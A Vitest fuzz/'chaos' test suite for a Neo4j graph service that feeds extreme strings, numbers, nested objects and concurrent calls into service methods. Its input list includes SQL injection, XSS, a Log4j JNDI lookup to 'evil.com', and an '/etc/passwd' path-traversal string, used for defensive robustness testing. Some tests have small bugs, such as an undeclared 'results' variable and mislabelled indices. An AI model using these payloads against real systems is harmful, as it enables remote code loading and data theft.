import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { GraphService } from '../src/services/graph-service';
import { createMockDriver } from './mock-neo4j';
import neo4j from 'neo4j-driver';

// Chaos testing parameters - 5000+ test combinations
const CHAOS_SCALE = 5000;

describe.skipIf(process.env.CI)('COMPREHENSIVE CHAOS TESTING - 5000+ Attack Vectors', () => {
  let mockGraphService: GraphService;
  let realGraphService: GraphService | null = null;
  let realDriver: any = null;
  
  beforeAll(async () => {
    // Mock service always available
    const mockDriver = createMockDriver();
    mockGraphService = new GraphService(mockDriver);
    
    // Try to connect to real database if available
    try {
      realDriver = neo4j.driver(
        'bolt://localhost:7687',
        neo4j.auth.basic('neo4j', 'graphdone_password'),
        { disableLosslessIntegers: true }
      );
      const session = realDriver.session();
      await session.run('RETURN 1');
      await session.close();
      realGraphService = new GraphService(realDriver);
      console.log('🗄️ Real database available for chaos testing');
    } catch (error) {
      console.log('⚠️ Real database not available, using mock only');
    }
  });

  afterAll(async () => {
    if (realDriver) {
      await realDriver.close();
    }
  });

  // Generate extreme test data combinations
  const generateChaosData = () => {
    const extremeStrings = [
      '', // Empty
      'a', // Single char
      'x'.repeat(1), // Tiny
      'x'.repeat(100), // Medium
      'x'.repeat(1000), // Large
      'x'.repeat(10000), // Huge
      'x'.repeat(100000), // Massive
      '🚀💀👾🤖🔥💎⚡🌈🦄🎭🎪🎨🎯🎲🎸🎺🎻🎹', // Emoji overload
      '测试中文字符العربيةрусскийไทย日本語한국어', // Multi-language
      '\0\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F', // Control chars
      '\'"; DROP TABLE users; --', // SQL injection
      '<script>alert("xss")</script>', // XSS
      '${jndi:ldap://evil.com/a}', // Log4j
      '../../etc/passwd', // Path traversal
      '%00%01%02%03', // Null bytes
      'A'.repeat(65536), // Buffer overflow attempt
      '\\n\\r\\t\\\\', // Escape sequences
      '"quotes"and\'apostrophes\'', // Quote mixing
      'line1\nline2\rline3\r\nline4', // Line endings
      '   leading and trailing spaces   ', // Whitespace
      '\u{1F4A9}\u{1F1FA}\u{1F1F8}', // Complex unicode
      String.fromCharCode(...Array.from({length: 100}, (_, i) => i)), // All ASCII
    ];

    const extremeNumbers = [
      0, -0, 1, -1, 0.1, -0.1,
      Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER,
      Number.MAX_VALUE, Number.MIN_VALUE,
      Number.POSITIVE_INFINITY, Number.NEGATIVE_INFINITY,
      Number.NaN,
      Math.PI, Math.E,
      0.1 + 0.2, // Floating point precision
      1e100, 1e-100, 1e308, 5e-324,
      2**31 - 1, -(2**31), // 32-bit int limits
      2**63 - 1, -(2**63), // 64-bit int limits
      999999999999999, -999999999999999,
    ];

    const extremeObjects = [
      null, undefined, {}, [],
      { a: 1 }, { a: null }, { a: undefined },
      { nested: { deep: { very: { deep: 'value' } } } },
      Array.from({length: 1000}, (_, i) => i), // Large array
      Object.fromEntries(Array.from({length: 100}, (_, i) => [`key${i}`, `value${i}`])), // Large object
      { circular: null as any }, // Will be made circular
      { date: new Date(), regex: /test/gi, func: () => {} },
      { buffer: Buffer.from('test'), error: new Error('test') },
    ];

    // Make circular reference
    const circular = extremeObjects[extremeObjects.length - 4] as any;
    circular.circular = circular;

    return { extremeStrings, extremeNumbers, extremeObjects };
  };

  const { extremeStrings, extremeNumbers, extremeObjects } = generateChaosData();

  // Node type chaos - test all combinations
  const nodeTypes = ['OUTCOME', 'EPIC', 'INITIATIVE', 'STORY', 'TASK', 'BUG', 'FEATURE', 'MILESTONE'];
  const nodeStatuses = ['PROPOSED', 'ACTIVE', 'IN_PROGRESS', 'BLOCKED', 'COMPLETED', 'ARCHIVED'];
  const graphTypes = ['PROJECT', 'WORKSPACE', 'SUBGRAPH', 'TEMPLATE'];
  const edgeTypes = ['DEPENDS_ON', 'BLOCKS', 'RELATES_TO', 'CONTAINS', 'PART_OF'];

  describe('Node Creation Chaos - String Attacks', () => {
    extremeStrings.forEach((testString, index) => {
      nodeTypes.forEach((nodeType, typeIndex) => {
        nodeStatuses.forEach((status, statusIndex) => {
          it(`should handle extreme string ${index} with ${nodeType}/${status}: "${testString.substring(0, 30)}..."`, async () => {
            const services = [mockGraphService];
            if (realGraphService) services.push(realGraphService);

            for (const service of services) {
              try {
                const result = await service.createNode({
                  title: testString,
                  description: testString,
                  type: nodeType,
                  status: status
                });
                expect(result).toBeDefined();
                expect(result.content).toBeDefined();
              } catch (error: any) {
                // Some extreme inputs should fail gracefully
                expect(error.message).toBeDefined();
              }
            }
          });
        });
      });
    });
  });

  describe('Priority Chaos - Number Attacks', () => {
    extremeNumbers.forEach((testNumber, index) => {
      nodeTypes.forEach((nodeType, typeIndex) => {
        it(`should handle extreme number ${index} (${testNumber}) for ${nodeType}`, async () => {
          const services = [mockGraphService];
          if (realGraphService) services.push(realGraphService);

          for (const service of services) {
            try {
              const result = await service.updatePriorities({
                node_id: `chaos-node-${index}-${typeIndex}`,
                priority_executive: testNumber,
                priority_individual: testNumber,
                priority_community: testNumber
              });
              expect(result).toBeDefined();
            } catch (error: any) {
              // Invalid numbers should fail gracefully
              expect(error.message).toBeDefined();
            }
          }
        });
      });
    });
  });

  describe('Graph Management Chaos - Type Combinations', () => {
    graphTypes.forEach((graphType) => {
      extremeStrings.slice(0, 10).forEach((testString, stringIndex) => { // Limit for performance
        extremeObjects.slice(0, 5).forEach((testObj, objIndex) => {
          it(`should handle ${graphType} with string ${stringIndex} and object ${objIndex}`, async () => {
            const services = [mockGraphService];
            if (realGraphService) services.push(realGraphService);

            for (const service of services) {
              try {
                // Skip empty names as they should fail validation
                if (testString.trim().length === 0) {
                  await expect(service.createGraph({
                    name: testString,
                    type: graphType,
                    settings: testObj
                  })).rejects.toThrow();
                } else {
                  const result = await service.createGraph({
                    name: testString,
                    type: graphType,
                    settings: testObj
                  });
                  expect(result).toBeDefined();
                }
              } catch (error: any) {
                // Some combinations should fail gracefully
                expect(error.message).toBeDefined();
              }
            }
          });
        });
      });
    });
  });

  describe('Edge Creation Chaos - Relationship Attacks', () => {
    edgeTypes.forEach((edgeType) => {
      extremeStrings.slice(0, 8).forEach((sourceId, sourceIndex) => {
        extremeStrings.slice(0, 8).forEach((targetId, targetIndex) => {
          it(`should handle ${edgeType} from "${sourceId.substring(0, 20)}" to "${targetId.substring(0, 20)}"`, async () => {
            const services = [mockGraphService];
            if (realGraphService) services.push(realGraphService);

            for (const service of services) {
              try {
                const result = await service.createEdge({
                  source_node_id: sourceId || 'fallback-source',
                  target_node_id: targetId || 'fallback-target',
                  type: edgeType
                });
                expect(result).toBeDefined();
              } catch (error: any) {
                // Invalid IDs should fail gracefully
                expect(error.message).toBeDefined();
              }
            }
          });
        });
      });
    });
  });

  describe('Metadata Chaos - Deep Object Attacks', () => {
    extremeObjects.forEach((testObj, objIndex) => {
      nodeTypes.slice(0, 4).forEach((nodeType, typeIndex) => { // Limit for performance
        it(`should handle complex metadata ${objIndex} for ${nodeType}`, async () => {
          const services = [mockGraphService];
          if (realGraphService) services.push(realGraphService);

          for (const service of services) {
            try {
              // Avoid circular references in real tests
              const safeObj = objIndex === 9 ? { safe: 'value' } : testObj;
              
              const result = await service.createNode({
                title: `Metadata Test ${objIndex}`,
                type: nodeType,
                metadata: safeObj
              });
              expect(result).toBeDefined();
            } catch (error: any) {
              // Complex objects might fail
              expect(error.message).toBeDefined();
            }
          }
        });
      });
    });
  });

  describe('Concurrent Operation Chaos - Race Condition Attacks', () => {
    Array.from({ length: 50 }, (_, batchIndex) => {
      it(`should handle concurrent batch ${batchIndex}`, async () => {
        const operations = Array.from({ length: 20 }, (_, opIndex) => {
          const service = Math.random() > 0.5 ? mockGraphService : (realGraphService || mockGraphService);
          const operation = Math.floor(Math.random() * 4);
          
          switch (operation) {
            case 0:
              return service.createNode({
                title: `Concurrent Node ${batchIndex}-${opIndex}`,
                type: nodeTypes[Math.floor(Math.random() * nodeTypes.length)]
              });
            case 1:
              return service.createGraph({
                name: `Concurrent Graph ${batchIndex}-${opIndex}`,
                type: graphTypes[Math.floor(Math.random() * graphTypes.length)]
              });
            case 2:
              return service.updatePriorities({
                node_id: `node-${batchIndex}-${opIndex}`,
                priority_executive: Math.random()
              });
            default:
              return service.getNodeDetails({
                node_id: `node-${batchIndex}-${opIndex}`
              });
          }
        });

        const results = await Promise.allSettled(operations);
        
        // All operations should either succeed or fail gracefully
        results.forEach(result => {
          expect(['fulfilled', 'rejected'].includes(result.status)).toBe(true);
        });
      });
    });
  });

  describe('Query Parameter Chaos - Input Validation Attacks', () => {
    const chaosParams = [
      // Valid but extreme values
      { limit: Number.MAX_SAFE_INTEGER, offset: 0 },
      { limit: 0, offset: Number.MAX_SAFE_INTEGER },
      { limit: -1, offset: -1 },
      { limit: 1.5, offset: 2.7 }, // Floats instead of integers
      
      // String injections
      { contributor_id: 'normal-id' },
      { contributor_id: extremeStrings[5] }, // Large string
      { contributor_id: extremeStrings[10] }, // Control chars
      { contributor_id: extremeStrings[12] }, // SQL injection
      
      // Time window attacks
      { time_window_days: 0 },
      { time_window_days: -30 },
      { time_window_days: 999999 },
      { time_window_days: 0.001 },
      
      // Boolean confusion
      { include_metrics: 'true' as any },
      { include_metrics: 1 as any },
      { include_metrics: 'false' as any },
    ];

    chaosParams.forEach((params, paramIndex) => {
      ['getContributorPriorities', 'getContributorWorkload', 'listGraphs'].forEach((method) => {
        it(`should handle chaotic params ${paramIndex} for ${method}`, async () => {
          const services = [mockGraphService];
          if (realGraphService) services.push(realGraphService);

          for (const service of services) {
            try {
              const result = await (service as any)[method](params);
              expect(result).toBeDefined();
            } catch (error: any) {
              // Invalid params should fail gracefully
              expect(error.message).toBeDefined();
            }
          }
        });
      });
    });
  });

  describe('Memory Pressure Chaos - Resource Exhaustion Attacks', () => {
    Array.from({ length: 100 }, (_, testIndex) => {
      it(`should handle memory pressure test ${testIndex}`, async () => {
        const largeData = {
          title: `Memory Test ${testIndex}`,
          type: 'TASK',
          metadata: {
            large_array: Array.from({ length: 1000 }, (_, i) => ({
              id: `item-${i}`,
              data: 'x'.repeat(100),
              timestamp: new Date().toISOString(),
              random: Math.random(),
              nested: {
                deep: {
                  value: `deep-value-${i}`,
                  more_data: Array.from({ length: 10 }, (_, j) => `data-${j}`)
                }
              }
            }))
          }
        };

        try {
          const result = await mockGraphService.createNode(largeData);
          expect(result).toBeDefined();
        } catch (error: any) {
          // Memory exhaustion should fail gracefully
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  describe('Serialization Chaos - JSON Attacks', () => {
    const jsonAttacks = [
      { normal: 'value' },
      { 'weird-key-!@#$%^&*()': 'value' },
      { '': 'empty key' },
      { 'null': null },
      { 'undefined': undefined },
      { 'function': 'function() { return "hack"; }' },
      { 'array': [1, 2, 3, [4, 5, [6, 7, [8, 9]]]] },
      { 'deeply': { nested: { object: { with: { many: { levels: 'deep' } } } } } },
      { 'mixed': { a: 1, b: 'string', c: true, d: null, e: [1, 2, 3] } },
      { 'special_chars': '§±!@#$%^&*()_+-=[]{}|;:,.<>?`~' },
    ];

    jsonAttacks.forEach((attack, attackIndex) => {
      nodeTypes.slice(0, 3).forEach((nodeType, typeIndex) => {
        it(`should handle JSON attack ${attackIndex} for ${nodeType}`, async () => {
          const services = [mockGraphService];
          if (realGraphService) services.push(realGraphService);

          for (const service of services) {
            try {
              const result = await service.createNode({
                title: `JSON Attack ${attackIndex}`,
                type: nodeType,
                metadata: attack
              });
              expect(result).toBeDefined();
              
              // Verify response is valid JSON
              const content = result.content[0].text;
              const parsed = JSON.parse(content);
              expect(parsed).toBeDefined();
            } catch (error: any) {
              // Some attacks should fail gracefully
              expect(error.message).toBeDefined();
            }
          }
        });
      });
    });
  });

  describe('Database Connection Chaos - Network Attacks', () => {
    if (realGraphService) {
      Array.from({ length: 100 }, (_, testIndex) => {
        it(`should handle database stress test ${testIndex}`, async () => {
          const rapidOperations = Array.from({ length: 10 }, (_, opIndex) => {
            return realGraphService!.createNode({
              title: `DB Stress ${testIndex}-${opIndex}`,
              type: 'TASK'
            });
          });

          const results = await Promise.allSettled(rapidOperations);
          
          results.forEach(result => {
            expect(['fulfilled', 'rejected'].includes(result.status)).toBe(true);
          });
        });
      });
    } else {
      it.skip('should skip database connection chaos (no real database)', () => {
        // This test is skipped because no real database is available
        // The skip will be visible in test output as a clear indicator
      });
    }
  });

  describe('Error Recovery Chaos - Exception Handling Attacks', () => {
    const errorScenarios = [
      { scenario: 'invalid_method', data: { invalid_field: 'value' } },
      { scenario: 'malformed_id', data: { node_id: null } },
      { scenario: 'circular_ref', data: { circular: null } },
      { scenario: 'type_mismatch', data: { priority_executive: 'not_a_number' } },
      { scenario: 'missing_required', data: {} },
    ];

    errorScenarios.forEach((scenario, scenarioIndex) => {
      Array.from({ length: 50 }, (_, testIndex) => {
        it(`should recover from error scenario ${scenarioIndex}-${testIndex}: ${scenario.scenario}`, async () => {
          const services = [mockGraphService];
          if (realGraphService) services.push(realGraphService);

          for (const service of services) {
            try {
              // Intentionally trigger errors and test recovery
              const result = await service.updateNode(scenario.data as any);
              
              // If it doesn't throw, verify graceful handling with proper response
              expect(result).toBeDefined();
              expect(result.content).toBeDefined();
              expect(Array.isArray(result.content)).toBe(true);
            } catch (error: any) {
              // Errors should be well-formed
              expect(error.message).toBeDefined();
              expect(typeof error.message).toBe('string');
              expect(error.message.length).toBeGreaterThan(0);
            }
          }
        });
      });
    });
  });

  describe('Performance Chaos - Timing Attacks', () => {
    Array.from({ length: 200 }, (_, testIndex) => {
      it(`should handle performance test ${testIndex} within reasonable time`, async () => {
        const startTime = Date.now();
        
        try {
          const operation = testIndex % 4;
          let result;
          
          switch (operation) {
            case 0:
              result = await mockGraphService.createNode({
                title: `Performance Test ${testIndex}`,
                type: 'TASK'
              });
              break;
            case 1:
              result = await mockGraphService.getNodeDetails({
                node_id: `perf-node-${testIndex}`
              });
              break;
            case 2:
              result = await mockGraphService.listGraphs({
                limit: 10,
                offset: testIndex
              });
              break;
            default:
              result = await mockGraphService.updatePriorities({
                node_id: `perf-node-${testIndex}`,
                priority_executive: Math.random()
              });
          }
          
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          expect(result).toBeDefined();
          expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
        } catch (error: any) {
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Even errors should be fast
          expect(duration).toBeLessThan(5000);
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  // Define chaos parameters at module level for reuse
  const priorities = [0, 0.1, 0.5, 0.9, 1.0, -1, 2, Number.NaN, Number.POSITIVE_INFINITY];
  const booleans = [true, false, 'true', 'false', 1, 0, null, undefined];
  const limits = [0, 1, 10, 50, 100, 1000, -1, Number.MAX_SAFE_INTEGER];

  describe('Massive Parameter Combinations - Full Matrix Attacks', () => {
    
    priorities.forEach((priority, pIndex) => {
      nodeTypes.forEach((nodeType, nIndex) => {
        graphTypes.forEach((graphType, gIndex) => {
          it(`should handle priority ${pIndex} (${priority}) for ${nodeType} in ${graphType}`, async () => {
            try {
              const result = await mockGraphService.updatePriorities({
                node_id: `combo-${pIndex}-${nIndex}-${gIndex}`,
                priority_executive: priority,
                priority_individual: priority * 0.8,
                priority_community: priority * 1.2
              });
              expect(result).toBeDefined();
              expect(result.content).toBeDefined();
            } catch (error: any) {
              expect(error.message).toBeDefined();
            }
          });
        });
      });
    });
  });

  describe('Boolean Confusion Chaos - Type Coercion Attacks', () => {
    booleans.forEach((bool, bIndex) => {
      extremeStrings.slice(0, 10).forEach((str, sIndex) => {
        it(`should handle boolean ${bIndex} (${bool}) with string ${sIndex}`, async () => {
          try {
            const result = await mockGraphService.createGraph({
              name: `Bool Test ${bIndex}-${sIndex}`,
              type: 'PROJECT',
              isShared: bool as any
            });
            expect(result).toBeDefined();
          } catch (error: any) {
            expect(error.message).toBeDefined();
          }
        });
      });
    });
  });

  describe('Limit Testing Chaos - Boundary Attacks', () => {
    limits.forEach((limit, lIndex) => {
      limits.forEach((offset, oIndex) => {
        nodeTypes.slice(0, 4).forEach((nodeType, nIndex) => {
          it(`should handle limit ${lIndex} (${limit}) offset ${oIndex} (${offset}) for ${nodeType}`, async () => {
            try {
              const result = await mockGraphService.getContributorPriorities({
                contributor_id: `limit-test-${lIndex}-${oIndex}-${nIndex}`,
                limit: limit,
                priority_type: 'composite'
              });
              expect(result).toBeDefined();
            } catch (error: any) {
              expect(error.message).toBeDefined();
            }
          });
        });
      });
    });
  });

  describe('Bulk Operation Chaos - Compound Attacks', () => {
    Array.from({length: 500}, (_, bulkIndex) => {
      it(`should handle bulk chaos operation ${bulkIndex}`, async () => {
        const operations = Array.from({length: 10}, (_, opIndex) => ({
          type: ['create_node', 'update_node', 'create_edge', 'delete_edge'][Math.floor(Math.random() * 4)] as any,
          params: {
            node_id: `bulk-${bulkIndex}-${opIndex}`,
            title: extremeStrings[Math.floor(Math.random() * extremeStrings.length)],
            type: nodeTypes[Math.floor(Math.random() * nodeTypes.length)],
            priority_executive: extremeNumbers[Math.floor(Math.random() * extremeNumbers.length)]
          }
        }));

        try {
          const result = await mockGraphService.bulkOperations({
            operations,
            transaction: Math.random() > 0.5,
            rollback_on_error: Math.random() > 0.5
          });
          expect(result).toBeDefined();
        } catch (error: any) {
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  describe('Deep Nesting Chaos - Structural Attacks', () => {
    Array.from({length: 200}, (_, nestIndex) => {
      it(`should handle deep nesting attack ${nestIndex}`, async () => {
        // Create deeply nested metadata
        let deepObj: any = { value: `deep-${nestIndex}` };
        for (let i = 0; i < 20; i++) {
          deepObj = { level: i, nested: deepObj };
        }

        try {
          const result = await mockGraphService.createNode({
            title: `Deep Nest ${nestIndex}`,
            type: nodeTypes[nestIndex % nodeTypes.length],
            metadata: deepObj
          });
          expect(result).toBeDefined();
        } catch (error: any) {
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  describe('Array Explosion Chaos - Collection Attacks', () => {
    Array.from({length: 300}, (_, arrayIndex) => {
      it(`should handle array explosion ${arrayIndex}`, async () => {
        const hugeArray = Array.from({length: 100 + arrayIndex}, (_, i) => ({
          id: `array-${arrayIndex}-${i}`,
          data: extremeStrings[i % extremeStrings.length],
          number: extremeNumbers[i % extremeNumbers.length],
          nested: Array.from({length: 5}, (_, j) => `nested-${j}`)
        }));

        try {
          const result = await mockGraphService.createNode({
            title: `Array Explosion ${arrayIndex}`,
            type: 'TASK',
            metadata: { huge_array: hugeArray }
          });
          expect(result).toBeDefined();
        } catch (error: any) {
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  describe('Unicode Chaos - Character Encoding Attacks', () => {
    const unicodeRanges = [
      // Basic Latin, Latin-1 Supplement, Latin Extended-A & B
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x0020 + i)),
      // Greek and Coptic
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x0370 + i)),
      // Cyrillic
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x0400 + i)),
      // CJK Symbols and Punctuation
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x3000 + i)),
      // Hiragana
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x3040 + i)),
      // Emoji (partial)
      Array.from({length: 50}, (_, i) => String.fromCharCode(0x1F300 + i)),
    ];

    unicodeRanges.flat().forEach((char, charIndex) => {
      if (charIndex % 10 === 0) { // Sample every 10th character to manage test count
        nodeTypes.forEach((nodeType, typeIndex) => {
          it(`should handle unicode char ${charIndex} (${char}) with ${nodeType}`, async () => {
            try {
              const result = await mockGraphService.createNode({
                title: `Unicode ${char} Test`,
                description: char.repeat(20),
                type: nodeType
              });
              expect(result).toBeDefined();
            } catch (error: any) {
              expect(error.message).toBeDefined();
            }
          });
        });
      }
    });
  });

  describe('Timing Attack Chaos - Race Conditions', () => {
    Array.from({length: 200}, (_, raceIndex) => {
      it(`should handle race condition ${raceIndex}`, async () => {
        const delays = [0, 1, 5, 10, 50, 100];
        const operations = delays.map(async (delay, delayIndex) => {
          if (delay > 0) {
            await new Promise(resolve => setTimeout(resolve, delay));
          }
          return mockGraphService.createNode({
            title: `Race ${raceIndex}-${delayIndex}`,
            type: nodeTypes[delayIndex % nodeTypes.length]
          });
        });

        const results = await Promise.allSettled(operations);
        results.forEach(result => {
          expect(['fulfilled', 'rejected'].includes(result.status)).toBe(true);
        });
      });
    });
  });

  describe('State Corruption Chaos - Persistence Attacks', () => {
    Array.from({length: 100}, (_, stateIndex) => {
      it(`should handle state corruption ${stateIndex}`, async () => {
        // Try to corrupt state with conflicting operations
        const nodeId = `state-corruption-${stateIndex}`;
        
        try {
          // Rapid-fire conflicting operations
          await Promise.allSettled([
            mockGraphService.createNode({ title: 'Node 1', type: 'TASK' }),
            mockGraphService.updatePriorities({ node_id: nodeId, priority_executive: 0.5 }),
            mockGraphService.deleteNode({ node_id: nodeId }),
            mockGraphService.createEdge({ 
              source_node_id: nodeId, 
              target_node_id: 'target-node',
              type: 'DEPENDS_ON'
            }),
            mockGraphService.updateNode({ 
              node_id: nodeId, 
              title: 'Updated Title',
              status: 'COMPLETED' 
            })
          ]);
          // Verify all concurrent operations completed without throwing
          expect(results).toBeDefined();
          expect(Array.isArray(results)).toBe(true);
        } catch (error: any) {
          expect(error.message).toBeDefined();
        }
      });
    });
  });

  // Final verification - system should still be responsive after all chaos
  describe('Post-Chaos System Health Check', () => {
    it('should maintain system stability after chaos testing', async () => {
      const services = [mockGraphService];
      if (realGraphService) services.push(realGraphService);

      for (const service of services) {
        // System should still respond to basic operations
        const result = await service.createNode({
          title: 'Health Check Node',
          type: 'TASK'
        });
        
        expect(result).toBeDefined();
        expect(result.content).toBeDefined();
        expect(result.content[0].text).toBeDefined();
        
        // Response should be valid JSON
        const parsed = JSON.parse(result.content[0].text);
        expect(parsed).toBeDefined();
      }
    });
  });
});